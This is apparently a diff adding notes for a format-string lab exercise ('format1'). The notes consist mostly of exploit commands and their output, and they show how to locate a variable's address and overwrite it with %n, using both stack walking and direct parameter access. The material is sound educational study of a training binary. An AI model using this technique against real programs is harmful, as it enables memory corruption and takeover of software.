@@ -1,0 +1,24 @@
+# objdump -t format1 | grep target
+08049638 g     O .bss	00000004              target
+
+Method 1
+=====================
+- find the address of format string. We know "it lies far up the stack":
+$ ./format1 `python -c 'print "ABCD" + "X" * 3 + "%x."*128'`
+ABCDXXX804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff830.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.39f73080.13a3a690.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff826.bffff830.0.bffff9b8.bffff9c3.bffff9d3.bffff9f4.bffffa07.bffffa11.bfffff01.bfffff15.bfffff53.bfffff6a.bfffff7b.bfffff83.bfffff93.bfffffa0.bfffffd4.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.febfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.71000000.e87934ac.beffe30d.4ebe2af8.69bc3e3e.363836.0.2f2e0000.6d726f66.317461.44434241.
+
+- modify the value of target: instead of the last byte printed, we use %n to modify the address:
+$ ./format1 `python -c 'print "\x38\x96\x04\x08" + "X" * 3 + "%x."*127 + "%n."'`
+8�XXX804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff830.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.26bbbe55.cef2845.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff826.bffff830.0.bffff9b8.bffff9c3.bffff9d3.bffff9f4.bffffa07.bffffa11.bfffff01.bfffff15.bfffff53.bfffff6a.bfffff7b.bfffff83.bfffff93.bfffffa0.bfffffd4.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.febfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.7d000000.afc34e52.2a956cab.5a49fea.69271b6a.363836.0.2f2e0000.6d726f66.317461..you have modified the target :)
+
+Method 2
+=====================
+- cosmetization with direct parameter access:
+Test:
+./format1 `python -c 'print "ABCD" + "X" * 4 + "%130$x."'`
+ABCDXXXX44434241.
+
+Modify:
+$ ./format1 `python -c 'print "\x38\x96\x04\x08" + "X" * 4 + "%130$n."'`
+8�XXXX.you have modified the target :)
+
